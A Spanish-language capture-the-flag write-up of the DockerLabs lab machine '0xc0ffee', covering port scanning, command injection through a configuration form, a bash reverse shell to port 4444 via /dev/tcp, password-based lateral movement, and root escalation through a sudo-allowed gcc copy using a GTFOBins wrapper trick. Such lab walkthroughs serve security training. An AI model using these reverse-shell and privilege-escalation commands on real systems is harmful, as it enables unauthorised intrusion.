---
title: DockerLabs - 0xc0ffee
summary: "Write-up del laboratorio 0xc0ffee de DockerLabs"
author: elcybercurioso
date: 2026-01-11
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_0xc0ffee"
image:
  path: main.webp
published: false
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/0xc0ffee]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT     STATE SERVICE
80/tcp   open  http
7777/tcp open  cbt
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/0xc0ffee]
└─$ nmap -sCV -p80,7777 172.17.0.2
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Security Verification Tool
|_http-server-header: Apache/2.4.58 (Ubuntu)
7777/tcp open  http    SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
```

## análisis

Comenzamos revisando la página principal del puerto 80 de la máquina, donde nos encontramos con un panel que nos solicita indicar una palabra clave para poder acceder:

![Desktop View](/20260107171659.webp){: width="972" height="589" .shadow}

En el análisis de los puertos con **nmap** también encontramos que el puerto 7777 está abierto, y tiene desplegado un servidor con Python, donde, al acceder, vemos una serie de ficheros y directorios:

![Desktop View](/20260107171921.webp){: width="700" height="460" .shadow}

Al comprobar el contenido de los ficheros `id_rsa` e `id_rsa.pub` que están dentro de la carpeta `.ssh`, vemos que están vacíos:

![Desktop View](/20260107172201.webp){: width="700" height="460" .shadow}

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/0xc0ffee]
└─$ cat id_rsa    

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/0xc0ffee]
└─$ cat id_rsa.pub
```

Con el fichero `.bash_history` pasa lo mismo, está vacío:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/0xc0ffee]
└─$ cat .bash_history
```

En `nota.txt` vemos que nos indican que hay algo sospechoso en el directorio:

![Desktop View](/20260107172039.webp){: width="700" height="460" .shadow}

Al revisar el fichero `history.txt` nos damos cuenta de que sí que hay algo sospechoso, y es que, dentro de todo el texto, hay una cadena entre dos comillas a la que se hace referencia dos veces, la cual es bastante sospechosa:

![Desktop View](/20260107172119.webp){: width="972" height="589" .shadow}

Comprobamos a ver si la cadena que buscan en el panel que vimos anteriormente es la que acabamos de encontrar:

![Desktop View](/20260107172836.webp){: width="972" height="589" .shadow}

Y vemos que así es:

![Desktop View](/20260107173503.webp){: width="972" height="589" .shadow}

Nos redirigirá automáticamente a otra página pasados unos segundos:

![Desktop View](/20260107172922.webp){: width="972" height="589" .shadow}

Vemos que nos permite indicar un nombre de fichero, y la configuración que queremos que contenga dicho fichero:

![Desktop View](/20260107180810.webp){: width="972" height="589" .shadow}

Tras darle a `Apply Configuration`, vemos que se crea el fichero que hemos indicado en el directorio principal del puerto 7777 de la máquina:

![Desktop View](/20260107181048.webp){: width="700" height="460" .shadow}

Comprobamos que el contenido es el mismo que nosotros hemos definido:

![Desktop View](/20260107181115.webp){: width="270" height="140" .shadow}

Podemos pensar que sería posible crear un fichero `cmd.php` que nos permita ejecutar comandos de forma remota:

![Desktop View](/20260107181208.webp){: width="972" height="589" .shadow}

Sin embargo, nos daremos cuenta de que al tratar de abrirlo, nos lo descargará únicamente:

![Desktop View](/20260107184046.webp){: width="972" height="589" .shadow}

Si seguimos probando, nos daremos cuenta de que podemos crear un fichero de configuración donde como `Configuration Data` le indicamos un comando (ya que parece que el formulario no valida que lo que nosotros estamos indicando tenga una estructura JSON o no):

![Desktop View](/20260107190205.webp){: width="972" height="589" .shadow}

Si luego llamamos a dicho fichero con la funcionalidad `Execute Remote Configuration`, veremos que el resultado del comando se verá reflejado por pantalla:

![Desktop View](/20260107190226.webp){: width="972" height="589" .shadow}

![Desktop View](/20260107190252.webp){: width="972" height="589" .shadow}

De esta manera, lo que logramos es obtener ejecución remota de comandos, o **Remote Command Injection**.

## acceso inicial (www-data)

Lo primero que haremos es ponernos en escucha (en mi caso por el puerto 4444 con **nc**), ya que vamos a obtener una consola remota.

Lo siguiente es crear un fichero de configuración con el comando que queremos ejecutar, que en este caso será el que nos entablará una **reverse shell**:

```bash
bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
```

![Desktop View](/20260107191102.webp){: width="972" height="589" .shadow}

Si ahora cargamos el fichero creado, deberíamos habernos entablado una consola remota:

![Desktop View](/20260107191213.webp){: width="972" height="589" .shadow}

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/0xc0ffee]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 60528
www-data@5bde31420ac0:/var/www/html/***********************$ whoami
whoami
www-data
www-data@5bde31420ac0:/var/www/html/***********************$ hostname -I
hostname -I
172.17.0.2
```

Trataremos la TTY para poder operar con mejor facilidad:

```bash
www-data@5bde31420ac0:/var/www/html/***********************$ script -c bash /dev/null
www-data@5bde31420ac0:/var/www/html/***********************$ script -c bash /dev/null         
Script started, output log file is '/dev/null'.
www-data@5bde31420ac0:/var/www/html/***********************$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/0xc0ffee]
└─$ stty raw -echo;fg
[1]  + continued  nc -nlvp 4444
                               reset xterm

www-data@5bde31420ac0:/var/www/html/***********************$ export TERM=xterm                         
www-data@5bde31420ac0:/var/www/html/***********************$ export SHELL=bash
www-data@5bde31420ac0:/var/www/html/***********************$ stty rows 37 columns 210
```

Listaremos también los usuarios del sistema que tengan asignada una consola en `/etc/passwd`:

```bash
www-data@5bde31420ac0:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
codebad:x:1001:1001:codebad,,,:/home/codebad:/bin/bash
metadata:x:1000:1000:metadata,,,:/home/metadata:/bin/bash
```

## movimiento lateral (codebad)

Al acceder a la carpeta `/home`, veremos que podremos listar el contenido del directorio personal del usuario `codebad`:

```bash
www-data@5bde31420ac0:/home$ ls -la
total 16
drwxr-xr-x 1 root     root     4096 Aug 29  2024 .
drwxr-xr-x 1 root     root     4096 Jan  7 17:14 ..
drwxr-xr-x 3 codebad  codebad  4096 Aug 29  2024 codebad
drwxr-x--- 2 metadata metadata 4096 Aug 29  2024 metadata
www-data@5bde31420ac0:/home$ cd codebad/
www-data@5bde31420ac0:/home/codebad$ ls -la
total 44
drwxr-xr-x 3 codebad  codebad   4096 Aug 29  2024 .
drwxr-xr-x 1 root     root      4096 Aug 29  2024 ..
-rw------- 1 codebad  codebad      5 Aug 29  2024 .bash_history
-rw-r--r-- 1 codebad  codebad    220 Aug 29  2024 .bash_logout
-rw-r--r-- 1 codebad  codebad   3771 Aug 29  2024 .bashrc
-rw-r--r-- 1 codebad  codebad    807 Aug 29  2024 .profile
-rwxr-xr-x 1 metadata metadata 16176 Aug 29  2024 code
drwxr-xr-x 2 root     root      4096 Aug 29  2024 secret
```

Al intentar leer el contenido del fichero `code`, veremos que se trata de un binario, ya que no es legible:

```bash
www-data@5bde31420ac0:/home/codebad$ cat code 
@@@@�▒▒▒00��   44�-�=�=p
```

Encontramos también una nota en la carpeta `secret`, la cual contiene una adivinanza:

```bash
www-data@5bde31420ac0:/home/codebad$ cat secret/adivina.txt 

Adivinanza

En el mundo digital, donde la protección es vital,
existe algo peligroso que debes evitar.
No es un virus común ni un simple error,
sino algo más sutil que trabaja con ardor.

Es el arte de lo malo, en el software es su reino,
se oculta y se disfraza, su propósito es el mismo.
No es virus, ni gusano, pero se comporta igual,
toma su nombre de algo que no es nada normal.

¿Qué soy?
```

La respuesta a la adivinanza es una palabra que es común a todo lo que indica el acertijo, y es a su vez la contraseña del usuario `codebad`:

```bash
www-data@5bde31420ac0:/home/codebad$ su codebad
Password: 
codebad@5bde31420ac0:~$ whoami
codebad
```

## movimiento lateral (metadata)

Revisando los permisos del usuario `codebad`, encontramos que puede ejecutar el binario `/home/codebad/code` que vimos anteriormente, pero con los permisos del usuario `metadata`:

```bash
codebad@5bde31420ac0:~$ sudo -l
Matching Defaults entries for codebad on 5bde31420ac0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User codebad may run the following commands on 5bde31420ac0:
    (metadata : metadata) NOPASSWD: /home/codebad/code
```

Lo primero que podemos revisar es la carpeta principal del usuario `metadata`, la cual contiene la primera flag, y un fichero `pass.txt` (que posiblemente contenga alguna contraseña):

```bash
codebad@5bde31420ac0:~$ sudo -u metadata /home/codebad/code /home/metadata/
pass.txt  user.txt
```

Pero ya que sabemos que el binario `/home/codebad/code` es una copia del binario `/usr/bin/ls`, pero con los permisos del usuario `metadata`, lo que haremos será buscar carpetas cuyo grupo sea `metadata`, donde destaca `/usr/local/bin`:

```bash
codebad@5bde31420ac0:~$ find / -group metadata 2>/dev/null
/home/codebad/code
/home/metadata
/usr/local/bin
```

Si tratamos de leer el contenido de dicho directorio, veremos que nos devuelve un nombre sospecho:

```bash
codebad@5bde31420ac0:~$ sudo -u metadata /home/codebad/code /usr/local/bin
**************
```

Probamos a ver si este nombre es la contraseña del usuario `metadata`, y vemos que así es:

```bash
codebad@5bde31420ac0:~$ su metadata
Password: 
metadata@5bde31420ac0:/home/codebad$ whoami
metadata
```

La primera flag es:

```bash
metadata@5bde31420ac0:~$ cat user.txt 
f5d2****************************
```
## escalada de privilegios (root)

El usuario `metadata` tiene asignados permisos SUDO para ejecutar el binario `/usr/bin/c89` como el usuario `root`:

```bash
metadata@5bde31420ac0:/home/codebad$ sudo -l
Matching Defaults entries for metadata on 5bde31420ac0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User metadata may run the following commands on 5bde31420ac0:
    (ALL : ALL) /usr/bin/c89
```

Revisando el binario `/usr/bin/c89` veremos que es una copia de otro binario, en este caso `/usr/bin/gcc`:

```bash
metadata@5bde31420ac0:/home/codebad$ /usr/bin/c89 --help
Usage: gcc [options] file...
Options:
  -pass-exit-codes         Exit with highest error code from a phase.
  --help                   Display this information.
```

Por ello, consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/gcc/#sudo), donde nos indican que podemos invocar una consola como otro usuario cuando tengamos permisos SUDO sobre el binario `gcc`:

![Desktop View](/20260107194438.webp){: width="972" height="589" .shadow}

Adaptamos el comando que nos indican para que concuerde con el caso que estamos tratando, y tras ejecutarlo, habremos obtenido la consola como el usuario `root`:

```bash
metadata@5bde31420ac0:/home/codebad$ sudo /usr/bin/c89 -wrapper /bin/sh,-s .
# whoami
root
```

La segunda flag es:

```bash
root@5bde31420ac0:~# cat root.txt 
d6c4****************************
```

Y hasta aquí la resolución de la máquina `0xc0ffee`!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>